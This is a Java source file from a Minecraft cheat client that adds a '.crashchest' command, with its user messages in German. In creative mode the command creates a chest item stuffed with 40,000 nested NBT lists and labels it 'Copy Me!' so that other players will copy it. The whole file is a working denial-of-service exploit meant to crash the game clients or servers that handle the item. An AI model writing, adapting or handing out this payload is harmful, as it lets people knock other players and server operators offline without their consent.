package de.crazymemecoke.command.commands;

import de.crazymemecoke.command.Command;
import de.crazymemecoke.utils.Notify;
import de.crazymemecoke.utils.Wrapper;
import net.minecraft.init.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;

public class CrashChest extends Command {

    String syntax = ".crashchest";
    String itemName = "§cCopy Me!";

    @Override
    public void execute(String[] args) {
        if (args.length == 0) {
            if (Wrapper.mc.thePlayer.inventory.getStackInSlot(36) != null) {
                if (Wrapper.mc.thePlayer.inventory.getStackInSlot(36).getDisplayName()
                        .equals(itemName))
                    Notify.chatMessage("Du hast bereits eine CrashChest");
                else
                    Notify.chatMessage("Ziehe deine Schuhe aus, um die CrashChest zu erhalten!");
                return;
            } else if (!Wrapper.mc.thePlayer.capabilities.isCreativeMode) {
                Notify.chatMessage("Nur im Kreativmodus verfügbar!");
                return;
            }
            ItemStack stack = new ItemStack(Blocks.chest);
            NBTTagCompound nbtTagCompound = new NBTTagCompound();
            NBTTagList nbtList = new NBTTagList();
            for (int i = 0; i < 40000; i++)
                nbtList.appendTag(new NBTTagList());
            nbtTagCompound.setTag("www.masterof13fps.com", nbtList);
            stack.setTagInfo("www.masterof13fps.com", nbtTagCompound);
            Wrapper.mc.thePlayer.getInventory()[0] = stack;
            stack.setStackDisplayName(itemName);
            Notify.chatMessage("Du hast eine CrashChest erhalten!");
        } else {
            Notify.chatMessage(syntax);
        }
    }

    @Override
    public String getName() {

        return "CrashChest";

    }

}
